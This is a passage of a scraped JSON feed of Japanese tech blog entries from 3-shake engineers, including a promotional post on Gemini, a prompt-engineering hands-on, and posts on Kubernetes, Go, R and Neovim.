Cloudのパートナー企業である株式会社スリーシェイク Sreake事業部にて、Geminiを用いた生成AIアプリケーション開発に携わっており、Geminiのビジネス利用でのメリットを語りたいと思います。Gemini-1.5-Proは最大200万トークンの読み込みが可能Geminiの強みの中で、最も他の生成AIモデルと差別化できているのが、トークン数の長さです。これにより、動画解析などへの利用もしやすくなりました。Geminiはマルチモーダルなので、音声、画像、動画なども処理可能です。量の目安としては以下になります。書籍15〜20冊程度の分量動画約2時間音声約22時間BigQueryで容易にデータ分析基盤を構築可能他のクラウドには同様のサービスがなく、同じ機能を実現するためには複数のサービスを組み合わせる必要があります。AzureやAWS、オンプレのデータはそのままで読み込みだけ行う機能もあります。今お使いのシステム構成はほぼ変えず、追加構築可能となります。Geminiは他のモデルと比較してトークンあたりの利用料が安いGoogle Cloud上で稼働させるのに最適化しているためです。他社のクラウドで使える生成AIモデルは別会社のものなので、クラウドも生成AIもGoogleのGeminiによって、この点も強みです！もしもGeminiの出力結果が著作権侵害で係争が発生してもGoogle Cloudがサポート他クラウドにはないサービスです。こちらも、クラウドも生成AIも会社が揃っている強みと言えるでしょう。真実性1位！Gemini 1.5 ProがNIKKEI Digital Governanceが調査した真実性のスコアで1位となりました！以下の記事は最初日経で見れていたと思うのですが、今はNIKKEI Digital Governanceに登録しないと見れないようです。博識のGoogle､主観強いMeta　生成AIの｢真実性｣を検証上記画像は下記記事から引用させていただきました。note.com2024年もあと少し。2025年もGeminiとともに生成AIを盛り上げていきたいと思います！GCP(Google Cloud Platform) Advent Calendar 2024 次の記事はknak72さんによる企業のセキュリティ強化に！ Chrome Enterprise Premium のURLフィルタリングとマルウェアスキャン機能です。","isoDate":"2024-11-30T14:30:39.000Z","dateMiliSeconds":1732977039000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"スリーシェイク、Google Cloud Japan の「 Google Cloud Partner Top Engineer 2025 」にて3名のエンジニアが受賞","link":"https://sreake.com/blog/%e3%82%b9%e3%83%aa%e3%83%bc%e3%82%b7%e3%82%a7%e3%82%a4%e3%82%af%e3%80%81google-cloud-japan-%e3%81%ae%e3%80%8c-google-cloud-partner-top-engineer-2025-%e3%80%8d%e3%81%ab%e3%81%a63%e5%90%8d%e3%81%ae/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）のエンジニア3名が、Google Cloud Japan が高い技術力を持ったエンジニアを表彰するプログラムである「 Google Cloud Partner Top Engineer 2025 」に選出されたことをお知らせします。The post スリーシェイク、Google Cloud Japan の「 Google Cloud Partner Top Engineer 2025 」にて3名のエンジニアが受賞 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-28T06:03:47.000Z","dateMiliSeconds":1732773827000,"authorName":"Sreake","authorId":"Sreake"},{"title":"3-shake における組織的な Google Cloud Partner Top Engineer 推進について","link":"https://sreake.com/blog/google-cloud-partner-top-engineer-2025/","contentSnippet":"はじめに 3-shakeで、Engineering Team Lead / SRE をやっている横尾（@866mfs）です 今回、3-shake では、佐藤 慧太(@SatohJohn), 横尾 杏之介(@866mfs) […]The post 3-shake における組織的な Google Cloud Partner Top Engineer 推進について first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-28T06:00:00.000Z","dateMiliSeconds":1732773600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"コミュニティ紹介: Kubernetes Meetup Novice","link":"https://speakerdeck.com/bells17/komiyuniteishao-jie-kubernetes-meetup-novice","contentSnippet":"Cloud Native Days Winter 2024のCommunity & Beginner LTでお話した資料です。\\r\\rhttps://pfem.notion.site/CNDW2024-Community-Beginner-LT-13821b0141e0800cb403c880cb4d2738","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"bells17","authorId":"bells17"},{"title":"メインテーマはKubernetes","link":"https://speakerdeck.com/nwiizo/meintemahakubernetes","contentSnippet":"2024年16:20-17:00（Track A）にて「メインテーマはKubernetes」というタイトルで登壇します。\\r\\rイベント名: Cloud Native Days Winter 2024\\r\\r公式URL:https://event.cloudnativedays.jp/cndw2024/\\r\\rセッションURL:https://event.cloudnativedays.jp/cndw2024/talks/2373","isoDate":"2024-11-28T05:00:00.000Z","dateMiliSeconds":1732770000000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"KubeCon + Cloud NativeCon North America 参加レポート","link":"https://sreake.com/blog/kubecon-cloud-nativecon-north-america-2024-report/","contentSnippet":"はじめに こんにちは！3-shak inc, で SRE をやっている横尾(@866mfs)です。 2024/11/12 ~ 2024/11/15 に開催された、\xa0KubeCon + CloudNativeCo […]The post KubeCon + Cloud NativeCon North America 参加レポート first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-27T00:28:01.000Z","dateMiliSeconds":1732667281000,"authorName":"Sreake","authorId":"Sreake"},{"title":"mini.aiで日本語の括弧の中身をrepeatableに編集する","link":"https://blog.atusy.net/2024/11/27/mini-ai-ja/","contentSnippet":"mini.aiとremapをうまく活用するとaj[で「foo」のような日本語の括弧に対して発動するテキストオブジェクトをdot-repeatableに実装できることに気付きました。","isoDate":"2024-11-27T00:00:00.000Z","dateMiliSeconds":1732665600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"社内活動の取り組み紹介~ スリーシェイクでこんな取り組みしてます ~","link":"https://speakerdeck.com/bells17/she-nei-huo-dong-noqu-rizu-mishao-jie-surisieikudekonnaqu-rizu-misitemasu","contentSnippet":"CloudNative Days Winter 2024 船上LT会 小さな一歩、大きな飛躍〜クラウドネイティブを継続する〜 で発表したLT資料です。\\rhttps://cloudnativedays.connpass.com/event/334620/","isoDate":"2024-11-26T05:00:00.000Z","dateMiliSeconds":1732597200000,"authorName":"bells17","authorId":"bells17"},{"title":"【ISUCON14対策】private-isuチャレンジ記","link":"https://zenn.dev/melanmeg/articles/a8ece09570279f","contentSnippet":"はじめに2024/12/8(日)に開催のISUCON14へ向けて練習した記録です。お題は private-isu と呼ばれるISUCON練習問題の中でも、特にメジャーなものを解くことにしました。結論として、最終スコアは44,2852点でした。ここに辿り着く道のりは険しかったです\uD83D\uDCA6練習リポジトリ：https://github.com/melanmeg/private-isu-challengeまた、パフォーマンス改善タスクを求められる現場の方々にも、実際に役立つテクニックも恐らくあるはずで、興味のある方、色んな方に読んでいただけると嬉しいです。改善したことだけ知りたい方...","isoDate":"2024-11-25T09:01:34.000Z","dateMiliSeconds":1732525294000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"週刊アトデ 2024-11-22","link":"https://blog.atusy.net/2024/11/22/atodeyomanakata/","contentSnippet":"アトデヨム、ウソジャナイ、ヨムノタノシー","isoDate":"2024-11-22T00:00:00.000Z","dateMiliSeconds":1732233600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Reckoner における Datadog Browser Test の活用事例 / Datadog Browser Test at Reckoner","link":"https://speakerdeck.com/nomadblacky/datadog-browser-test-at-reckoner","contentSnippet":"Japan Datadog User Group Meetup#6\\rhttps://datadog-jp.connpass.com/event/334594/","isoDate":"2024-11-20T05:00:00.000Z","dateMiliSeconds":1732078800000,"authorName":"Takumi Kadowaki","authorId":"nomadblacky"},{"title":"プロンプトエンジニアリングハンズオン","link":"https://shu-kob.hateblo.jp/entry/2024/11/19/172452","contentSnippet":"genai-users.connpass.com↑上記勉強会の資料です。shu-kob.hateblo.jp↑こちらの記事の「プロンプトエンジニアリング」もご覧ください。（上記記事はChatGPT）先ずは復習してみましょうGeminiにアクセスgemini.google.comお好みで、ChatGPTやClaudeを使用しても構いません。プロンプトエンジニアリングJSON形式で出力カレーのレシピを教えてください。出力は以下のJSON形式にしてください。==============={  \\"材料\\": [\\"材料1\\", \\"材料2\\"],  \\"手順\\": [\\"手順1\\", \\"手順2\\"]}==============={  \\"材料\\": [    \\"玉ねぎ 1個\\",    \\"にんじん 1本\\",    \\"じゃがいも 2個\\",    \\"牛肉 300g\\",    \\"カレールー 2箱\\",    \\"サラダ油 大さじ2\\",    \\"水 800ml\\",    \\"塩 少々\\",    \\"こしょう 少々\\"  ],  \\"手順\\": [    \\"玉ねぎ、にんじん、じゃがいもは食べやすい大きさに切る。\\",    \\"鍋にサラダ油を熱し、牛肉を炒め、色が変わったら玉ねぎを加えて炒める。\\",    \\"にんじん、じゃがいもを加えてさらに炒める。\\",    \\"水を加え、アクを取りながら煮込む。\\",    \\"野菜が柔らかくなったらカレールーを加えて溶かす。\\",    \\"塩こしょうで味を調え、5分ほど煮込む。\\"  ]}出力結果をJSON Formatterで確認JSON Formatter & ValidatorZero-shotプロンプティングZero-Shotプロンプティングとは、大規模言語モデル（LLM）に対して、事前に具体的な例を示すことなく、一度の指示でタスクを実行させるプロンプトエンジニアリング手法です。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================紅白出場歌手の選考基準 NHK公開芸能Few-shotプロンプティングFew-Shotプロンプティングは、大規模言語モデル（LLM）に対して、タスクを実行するための具体的な例をいくつか示すことで、モデルの性能を向上させるプロンプトエンジニアリングの手法です。Zero-Shotプロンプティングとの違いZero-Shotプロンプティングが、一切の例を示さずにタスクを実行させるのに対し、Few-Shotプロンプティングでは、少数の例を提示することで、モデルがより効率的にタスクを学習できるようにします。以下はニュース記事のタイトルです。「政治」「経済」「芸能」「スポーツ」「科学」「その他」のうち1つに分類してください。回答だけ一言で出力してください===========================「紅白出場歌手の選考基準 NHK公開」===========================以下は例です「G20 バイデン氏不在で集合写真」：政治「岡田将生&高畑充希結婚 SNS反応」：芸能芸能Zero-shot Chain-of-ThoughtプロンプティングZero-shot Chain-of-Thought（CoT）プロンプティングは、大規模言語モデル（LLM）に対して、具体的な例を示すことなく、段階的な推論プロセスを踏ませるように指示するプロンプトエンジニアリングの手法です。回答だけ一言で出力してください。10 + 2 * 3 - 4 * 28ステップバイステップで考えてください。10 + 2 * 3 - 4 * 2## ステップバイステップで解いてみましょう！**与えられた式:** 10 + 2 * 3 - 4 * 2**解き方:**数学では、**掛け算と割り算**は、**足し算と引き算**よりも先に計算します。これを**優先順位**と言います。1.  **掛け算を計算する:**    * 2 * 3 = 6    * 4 * 2 = 8    式は、10 + 6 - 8 に変わります。2.  **残りの計算を行う:**    * 10 + 6 = 16    * 16 - 8 = 8**答え:** 8**まとめ:**与えられた式をステップバイステップで解くと、答えは**8**になります。**ポイント:*** **優先順位:** 掛け算と割り算は、足し算と引き算よりも先に計算します。* **計算順序:** 左から右へ計算していきます。**補足:**もし、計算の順番を変えたい場合は、**かっこ**を使います。例えば、(10 + 2) * 3 - 4 * 2 のようにかっこでくくると、最初に10と2を足してから3をかけることになります。**この説明で理解できましたか？** もし、まだ疑問な点があれば、遠慮なく質問してくださいね。Few-shot Chain-of-ThoughtプロンプティングFew-shot CoTプロンプティングは、大規模言語モデル（LLM）に、いくつかの例を示しながら、段階的な推論プロセスを踏ませることで、より複雑な問題を解かせる手法です。このグループの奇数を合計すると偶数になります。: 4、8、9、15、12、2、1。A: 奇数を全て加えると(9, 15, 1)25になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 17、10、19、4、8、12、24。A: 奇数を全て加えると(17, 19)36になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 16、11、14、4、8、13、24。A: 奇数を全て加えると(11, 13)24になります。答えはTrueです。このグループの奇数を合計すると偶数になります。: 17、9、10、12、13、4、2。A: 奇数を全て加えると(17, 9, 13)39になります。答えはFalseです。このグループの奇数を合計すると偶数になります。: 15、32、5、13、82、7、1。A:参考文献LangChainとLangGraphによるRAG・AIエージェント［実践］入門10倍速で成果が出る！ChatGPTスゴ技大全","isoDate":"2024-11-19T08:24:52.000Z","dateMiliSeconds":1732004692000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Rのパッケージ内でloggerパッケージを使う","link":"https://blog.atusy.net/2024/11/19/logger-in-r-package/","contentSnippet":"Rのloggerパッケージをパッケージ開発に使う場合、.onLoad関数内でログレベルなどの設定しよう。.onLoad関数のpkgname引数をlogger::log_thresholdなどの設定関数のnamespace引数に渡すと、パッケージ内のログだけを対象に設定を変更できます。","isoDate":"2024-11-19T00:00:00.000Z","dateMiliSeconds":1731974400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"PostgreSQLので全文検索拡張機能、pg_bigmを試す","link":"https://zenn.dev/nnaka2992/articles/use_pgbigm_on_cloudsql","contentSnippet":"アプリケーションを開発しているとアプリケーションログの分析や、JSONデータに対する分析など全文検索機能を求められることがたびたびあります。そういった場合はElasticsearchのように全文検索に特化したデータベースを導入することが多いです。しかし単純な文章の検索[^特にトランザクション用途]や小規模に利用される場合ばわざわざ専用のデータベースを管理作りたくないというケースが多いです。今回はPostgreSQLで利用可能な全文検索インデックスの拡張機能であるpg_bigmを紹介します。 検証環境の作成 CloudSQL 構成Cloud SQL EditionsE...","isoDate":"2024-11-16T11:12:07.000Z","dateMiliSeconds":1731755527000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"コマンドの引数にJSONやYAMLを使うと便利かも","link":"https://blog.atusy.net/2024/11/16/json-as-cmd-args/","contentSnippet":"コマンドの引数をいっそJSONやYAMLにしちゃうと、シェルスクリプトの引数処理でwhileループを回避できる、配列など複雑な値もJSONの枠組みで扱える、JSONSchemaでバリデーションできると、嬉しいことが沢山かも。","isoDate":"2024-11-16T00:00:00.000Z","dateMiliSeconds":1731715200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"スリーシェイク、Think IT連載「Kubernetesスペシャリストが注目する関連ツール探求」が連載開始から1周年","link":"https://sreake.com/blog/kubernetes-2/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、インプレスグループが運営するエンジニア向け技術解説サイト「Think IT」にて連載中の「Kubernetesスペシャリストが注目する関連ツール探求」が、連載開始から1周年を迎えることをお知らせします。The post スリーシェイク、Think IT連載「Kubernetesスペシャリストが注目する関連ツール探求」が連載開始から1周年 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-14T01:00:00.000Z","dateMiliSeconds":1731546000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、「CloudNative Days Winter 2024」に出展・登壇","link":"https://sreake.com/blog/cloudnative-days-winter-2024/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、2024年11⽉28日（木）・29日（金）に開催される「CloudNative Days Winter 2024」に出展および登壇することをお知らせします。The post スリーシェイク、「CloudNative Days Winter 2024」に出展・登壇 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-12T01:19:07.000Z","dateMiliSeconds":1731374347000,"authorName":"Sreake","authorId":"Sreake"},{"title":"qfscope.nvimでtelescope.nvimの検索結果を絞り込む","link":"https://blog.atusy.net/2024/11/11/qfscope-nvim/","contentSnippet":"telescope.nvimの検索結果をファイル名や該当行の内容で絞り込みたいときのために、qfscope.nvimを開発しました。","isoDate":"2024-11-11T00:00:00.000Z","dateMiliSeconds":1731283200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"Kubernetes Sidecar 一問一答","link":"https://sreake.com/blog/kubernetes-native-sidecar/","contentSnippet":"はじめに Kubernetes 1.29からBeta機能となったSidecar Containerという機能を使う機会があったので、これについて一問一答形式で概要を共有してみようと思います。 小粒なTipsになりますがご […]The post Kubernetes Sidecar 一問一答 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-08T04:06:41.000Z","dateMiliSeconds":1731038801000,"authorName":"Sreake","authorId":"Sreake"},{"title":"データベースリライアビリティエンジニアリング輪読会","link":"https://sreake.com/blog/database-reliability-engineering-reading-circle/","contentSnippet":"はじめに こんにちは。株式会社スリーシェイク Sreake 事業部に所属している @Sugo Fumitaka です。Sreake 事業部は技術力が求められる領域で豊富な経験を持つ SRE の専門家が集まったチームです。 […]The post データベースリライアビリティエンジニアリング輪読会 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-08T04:00:52.000Z","dateMiliSeconds":1731038452000,"authorName":"Sreake","authorId":"Sreake"},{"title":"git rebaseの苦労を減らすための覚え書き","link":"https://blog.atusy.net/2024/11/07/git-rebase/","contentSnippet":"レビューやログを振り返る時のために、Gitのコミットログを整理するrebase作業が、少しでも楽になるよう個人的に気をつけているポイントをまとめました。","isoDate":"2024-11-07T00:00:00.000Z","dateMiliSeconds":1730937600000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"SREの前に","link":"https://speakerdeck.com/nwiizo/srenoqian-ni","contentSnippet":"2024年11月06日(水) 18:00～19:00の予定に遅刻してしまい、大変申し訳ございませんでした。お詫びとして、当初非公開予定であった資料を公開させていただきます。元々、公開する予定ではなかったので補足が足りない部分などあると思いますのでご容赦下さい。\\r\\rブログなどで補足情報出すかもなので気になればフォローしてください\\r- https://syu-m-5151.hatenablog.com/\\r- https://x.com/nwiizo\\r\\r\\rSREの前に - 運用の原理と方法論\\r公式URL: https://talent.supporterz.jp/events/2ed2656a-13ab-409c-a1d9-df8383be25fd/","isoDate":"2024-11-06T05:00:00.000Z","dateMiliSeconds":1730869200000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、「SRE総合支援コンサルティングサービス」および「Datadog導入支援サービス」を AWS Marketplace で提供開始","link":"https://sreake.com/blog/datadog_aws-marketplace/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）が提供する「SRE総合支援コンサルティングサービス」および「DataDog導入支援サービス」を AWS Marketplace で提供開始したことをお知らせします。The post スリーシェイク、「SRE総合支援コンサルティングサービス」および「Datadog導入支援サービス」を AWS Marketplace で提供開始 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-05T02:34:26.000Z","dateMiliSeconds":1730774066000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Generative AI Summit Tokyo ’24 Fallに参加しました","link":"https://sreake.com/blog/generative-ai-summit-tokyo-24-fall-2/","contentSnippet":"Sreake事業部インターン生の荒木です。先日Generative AI Summit Tokyo ’24 Fallに参加してまいりました！本イベントで得られた知見や、セッションの様子などを紹介します。 内容 […]The post Generative AI Summit Tokyo ’24 Fallに参加しました first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-05T01:02:35.000Z","dateMiliSeconds":1730768555000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Kubernetes Pod で Wasm と Linux コンテナを並行して実行する","link":"https://zenn.dev/z63d/articles/cccf07c5a36ab3","contentSnippet":"!雑なメモ、誤情報に注意 概要KubeCon + CloudNativeCon North America 2024 の Running WebAssembly (Wasm) Workloads Side-by-Side with Container Workloads が気になったので事前に少し調べたメモ。runwasi は Sidecar パターンを拡張します。Pod で軽量な Wasm を Linux コンテナの Sidecar として実行するメリットが色々あります。という話だと思う。 runwasishim を開発するライブラリ、shim プロセスをつくるものと...","isoDate":"2024-11-03T03:34:49.000Z","dateMiliSeconds":1730604889000,"authorName":"Kaita Nakamura","authorId":"kaita-nakamura"},{"title":"FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜","link":"https://sreake.com/blog/finops%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに 現在、さまざまな業界の多種多様なシステムにおいて、クラウドサービス\xad\xadが広く活用されています。 クラウドネイティブなシステムは、状況に応じて迅速に構築できること、柔軟にスケールできること等の利点がある一方 […]The post FinOpsとは 〜クラウドネイティブ・SRE・CCoEの導入によるFinOpsの実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:54.000Z","dateMiliSeconds":1730434134000,"authorName":"Sreake","authorId":"Sreake"},{"title":"クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜","link":"https://sreake.com/blog/%e3%82%af%e3%83%a9%e3%82%a6%e3%83%89%e3%83%8d%e3%82%a4%e3%83%86%e3%82%a3%e3%83%96%e3%81%a8%e3%81%af/","contentSnippet":"1. はじめに クラウドネイティブとは、クラウドの特性を最適に活用することを目指すアプローチや考え方のことです。 2006年にクラウドコンピューティングという言葉が誕生し、インターネット技術を利用してサービスを提供するコ […]The post クラウドネイティブとは 〜新時代を切り拓くためのCCoE・SRE導入と実践〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:34.000Z","dateMiliSeconds":1730434114000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜","link":"https://sreake.com/blog/platform-engineering/","contentSnippet":"1. はじめに Platform Engineeringとは、開発ポータルなどの共通的なツールやサービスを高度に整備し、開発者体験(DevEx)とソフトウェアデリバリの生産性を向上させるための取り組みです。 これは、企業 […]The post Platform Engineeringとは  〜SRE導入で目指す開発者体験の革新〜 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-11-01T04:08:14.000Z","dateMiliSeconds":1730434094000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Nixで最新のR環境を構築できなくてしんどい","link":"https://blog.atusy.net/2024/11/01/nix-r-is-tough/","contentSnippet":"先日、nix-shellでRを使うという記事を書きましたが、Nixで入れたRをふだん使いするのはしんどいな……と感じています。いかんせん、R本体もパッケージも最新のものを使えない現状があります。nix本家が対応に困ってる2024-11-01時点で最新のRは4.4.2ですが、nixで利用可能なRは4.4.1で止まっています。どうにも、パッケージの依存関係の都合で更新したくてもできない状況になっているようです。","isoDate":"2024-11-01T00:00:00.000Z","dateMiliSeconds":1730419200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"【CloudNative Entry】入社課題で学んだことTips","link":"https://zenn.dev/melanmeg/articles/f52c5aaa895523","contentSnippet":"はじめに10月から 3-shake に入社した melanmeg です。入社時課題が始まって、 やったこと・わかったこと をここに整理してみました！!内容は「クラウドネイティブのエントリーレベルのスキルを身に着ける」といったものになります前職ではAWS・Azureを触っていたため、今回Google Cloudで課題を進めることにしました。今まで触ってこなかったのでクラウドごとの特徴を知れる良い学びになりました。早速、整理したことを紹介していきます。 課題一言でいうと、『クラウドネイティブのエントリーレベルのスキルを身に着けるを目標の元、k8sクラスタ構築からwo...","isoDate":"2024-10-31T15:03:05.000Z","dateMiliSeconds":1730386985000,"authorName":"Naoya Yamamoto","authorId":"melanmeg"},{"title":"Kubernetes Gateway API 入門","link":"https://zenn.dev/tayusa/articles/786e3c11e631fe","contentSnippet":"ちょうど1年前にGAとなったKubernetesのGateway APIを触る機会がなかったので、個人的に理解を深めるようと思います。https://kubernetes.io/blog/2023/10/31/gateway-api-ga/ Gateway API とは？L4とL7ルーティングを担う次世代のKubernetes Ingress、Load Balancing、Service Mesh APIsです。汎用的で表現力があり役割が分離できるように設計されています。役割指向Kubernetesのサービスネットワークの利用と設定を行う組織の役割を表現したAPIリソースに...","isoDate":"2024-10-31T02:57:25.000Z","dateMiliSeconds":1730343445000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"WebサイトやGitHubソースコードを処理 (ハンズオン)","link":"https://shu-kob.hateblo.jp/entry/2024/10/29/190456","contentSnippet":"#7 WebサイトやGitHubソースコードを処理 (ハンズオン)【オンライン】 - connpassgenai-users.connpass.com勉強会の資料です。Google Cloudでクレデンシャルを取得IAMと管理 > サービスアカウント↓こちらの記事を参考shu-kob.hateblo.jp環境変数にセット以下はMacで、.zprofileの場合export GOOGLE_APPLICATION_CREDENTIALS=\\"/path/PROJECT_ID-XXXXXXXXXX.json\\"source ~/.zprofileソースコードを取得github.comgit clone https://github.com/shu-kob/genai-web-github-loadercd genai-web-github-loadernpm iWebページを読んで要約loadWebPages.tsで、プロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadWebPages.ts https://www.raumen.co.jp/rapedia/study_history/ソースコードの読み込んで仕様書を作成loadGitHubでプロジェクトIDの書き換えconst project = \'PROJECT_ID\' // 書き換える実行npx tsx loadGitHub.ts https://github.com/shu-kob/genai-web-github-loader","isoDate":"2024-10-29T10:04:56.000Z","dateMiliSeconds":1730196296000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Cilium Node IPAM LBによるロードバランシング","link":"https://sreake.com/blog/cilium-node-ipam-lb-load-balancing/","contentSnippet":"はじめに Sreake事業部でインターンをしている小林です。 本記事では、Cilium v1.16で追加されたCilium Node IPAM LBを検証しました。 Ciliumのロードバランシング方法 CiliumでL […]The post Cilium Node IPAM LBによるロードバランシング first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-28T05:08:45.000Z","dateMiliSeconds":1730092125000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Rでログを出力する（loggerパッケージ）","link":"https://blog.atusy.net/2024/10/25/r-logger/","contentSnippet":"先日「Rでndjson形式のログを解析する]」の記事を書いた流れで、そういえばRでログを出力する方法を知らないな思ったので調べてみました。Rでログを扱うパッケージはいくつかありますが、開発が盛んなのはloggerパッケージのようです。最近（2024年8月がごろ）はHadleyも開発に入っているので、安心感がありますね。loggerパッケージのWebサイトには、類似パッケージの紹介もあるので、他を見当したい場合も、まずはここを見てみるとよいでしょう。","isoDate":"2024-10-25T00:00:00.000Z","dateMiliSeconds":1729814400000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"スリーシェイク、 「内製化支援推進 AWS パートナー」認定を取得","link":"https://sreake.com/blog/aws_partner/","contentSnippet":"株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、 アマゾン ウェブ サービス（以下AWS）の AWS パートナープログラムにおける「内製化支援推進 AWS パートナー」に認定されたことをお知らせします。The post スリーシェイク、 「内製化支援推進 AWS パートナー」認定を取得 first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-23T01:00:00.000Z","dateMiliSeconds":1729645200000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Rでndjson形式のログを解析する","link":"https://blog.atusy.net/2024/10/22/anaylze-ndjson-logs-in-r/","contentSnippet":"最近、ndjson形式のログをRで解析しました。やはりtidyverseを使える体験のよさは他の追随を許しません。ただ、ndjson形式を直接読み込む方法を知らずに、jqコマンドを使って通常のJSON形式に変換してから読み込んでいました（cat file.ndjson | jq -c -s . > file.json）。読み込みからRで完結したいと思ったので、方法を調べてみました。","isoDate":"2024-10-22T00:00:00.000Z","dateMiliSeconds":1729555200000,"authorName":"Atsushi Yasumoto","authorId":"atusy"},{"title":"KubernetesセキュリティDeep Dive","link":"https://sreake.com/blog/kubernetes-security-deep-dive/","contentSnippet":"自己紹介 高橋 楓 公立千歳科学技術大学理工学部2年の高橋楓です。普段は趣味や他社の長期インターンにてソフトウェア開発を行っており、インフラ基盤にはDockerを利用しています。しかし、KubernetesやGoogle […]The post KubernetesセキュリティDeep Dive first appeared on sreake.com | 株式会社スリーシェイク.","isoDate":"2024-10-21T11:49:27.000Z","dateMiliSeconds":1729511367000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Goの公開、非公開フィールドについて","link":"https://zenn.dev/kamos/articles/1897b2a80b49c0","contentSnippet":"Goにはjavaでいうreadonlyのような、フィールドの変更を制御するような文法が存在しません。そのためGoではフィールドの公開、非公開が非常に重要な役割を持っています。Goで不変を表現したい場合、非公開なフィールドをつくり、それのゲッターを使って値を参照することが推奨されていますこの記事では興味本位ですが、フィールドの公開、非公開に注目して、どういった挙動をするのかまとめました。 検証 基本形それぞれの公開、非公開のプリミティブ型のフィールドを持っている場合は以下のようになります。pkg/item.gppackage pkgtype Item struct {...","isoDate":"2024-10-19T16:26:12.000Z","dateMiliSeconds":1729355172000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"Goのポインタをどう扱うべきか","link":"https://zenn.dev/kamos/articles/d6e79fc82abfaf","contentSnippet":"Goのポインタについて、結局どうやって使い分けたらいいんだっけ?となることがあったので、挙動を整理したうえで使い所をまとめてみました。 ポインタの挙動 基本的な挙動Goのポインタは、変数の値が格納されているメモリアドレスを指します。そのためポインタをPrintすると、その変数のメモリアドレスが表示されます。main.gofunc main() {\\tv := \\"Hello, World!\\" // v is a string\\tp := &v              // p is a pointer to v\\tfmt.Println(v)\\tfmt.Prin...","isoDate":"2024-10-19T07:03:56.000Z","dateMiliSeconds":1729321436000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"生成AI入門","link":"https://speakerdeck.com/shukob/sheng-cheng-airu-men-340f58db-c1be-4877-92b9-7fbf1df3105e","contentSnippet":"https://genai-users.connpass.com/event/333130/\\rOSCオンラインで生成AIの基礎知識から、実際に活用できる技術まで、幅広く解説しました。\\r\\r生成AIとは何か、その仕組みを解説します。\\r生成AIモデルを比較し、具体的なユースケースを紹介します。\\rプロンプトエンジニアリング、RAG (Retrieval Augmented Generation)などの技術を説明します。\\rオープンソースライブラリLangChainについてご紹介します。\\r最後に生成AIが社会に与える影響や、今後の展望について考えます。","isoDate":"2024-10-19T04:00:00.000Z","dateMiliSeconds":1729310400000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"k6 DevTools recorder を使ってみた","link":"https://zenn.dev/z63d/articles/0da90534fe5964","contentSnippet":"k6 DevTools recorder とはk6 のブラウザテストのスクリプトを生成してくれるツール（Chrome 拡張機能）です。Chrome DevTools Recorder を使って記録したフローをスクリプトに変換してくれます。https://grafana.com/docs/k6/latest/using-k6/test-authoring/create-tests-from-recordings/using-the-devtools-recorder/ 使ってみるCreate a script from a recording に使い方が書いてあります。C...","isoDate":"2024-10-16T12:00:33.000Z","dateMiliSeconds":1729080033000,"authorName":"Kaita Nakamura","authorId":"kaita-nakamura"},{"title":"スリーシェイク、「Developers X Summit 